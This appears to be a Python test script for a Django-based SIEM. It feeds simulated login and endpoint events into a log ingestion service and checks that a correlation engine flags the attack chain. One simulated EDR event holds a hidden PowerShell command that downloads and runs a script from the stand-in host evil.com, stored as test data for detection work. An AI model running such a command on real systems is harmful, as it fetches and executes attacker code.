import os
import django
import time
import sys
from datetime import datetime

# Setup Django environment
# Ensure the project root is in sys.path
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
if BASE_DIR not in sys.path:
    sys.path.append(BASE_DIR)

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'siem_project.settings')
try:
    django.setup()
except Exception as e:
    print(f"Error setting up Django: {e}")
    sys.exit(1)

# Import services after django.setup()
try:
    from audit.ingestion import LogIngestionService
    from audit.correlation import CorrelationEngine
except ImportError as e:
    print(f"Import Error: {e}")
    sys.exit(1)

def simulate_chain():
    username = "attacker_01"
    
    print(f"--- 1. Simulating Initial Access (UEBA Anomaly) ---")
    
    # 1.1 Establish Baseline (Normal Login)
    print(" - Establishing baseline with normal login...")
    normal_login = {
        "event": {"category": "authentication", "action": "login_attempt", "outcome": "success"},
        "user": {"name": username},
        "source": {"ip": "10.0.0.5"},
        "@timestamp": datetime.now().isoformat()
    }
    LogIngestionService.ingest_log(normal_login, "firewall")
    time.sleep(1)
    
    # 1.2 Trigge Anomaly (Login from Rare IP)
    print(" - Triggering anomaly with suspicious login...")
    login_event = {
        "event": {"category": "authentication", "action": "login_attempt", "outcome": "success"},
        "user": {"name": username},
        "source": {"ip": "45.10.20.30", "geo": {"country_name": "Unknown"}}, # Strange IP
        "@timestamp": datetime.now().isoformat()
    }
    res = LogIngestionService.ingest_log(login_event, "firewall")
    print(f"   Result: {res}")
    
    time.sleep(1)
    
    print(f"\n--- 2. Simulating Execution (EDR Process) ---")
    edr_event = {
        "event": {"category": "process", "action": "start"},
        "user": {"name": username},
        "host": {"name": "web-server-01", "ip": "10.0.0.5"},
        "process": {
            "name": "powershell.exe",
            "command_line": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
            "pid": 1234
        },
        "@timestamp": datetime.now().isoformat()
    }
    res = LogIngestionService.ingest_log(edr_event, "edr")
    print(f"   Result: {res}")
    
    time.sleep(2) # Allow ES indexing
    
    print(f"\n--- 3. Running Correlation Engine ---")
    try:
        count = CorrelationEngine.run_correlation_rules()
        print(f"   Generated {count} incidents.")
        
        if count > 0:
            print("[PASS] Attack Chain detected.")
        else:
            print("[FAIL] No incidents generated.")
    except Exception as e:
        print(f"Correlation Error: {e}")

if __name__ == "__main__":
    simulate_chain()
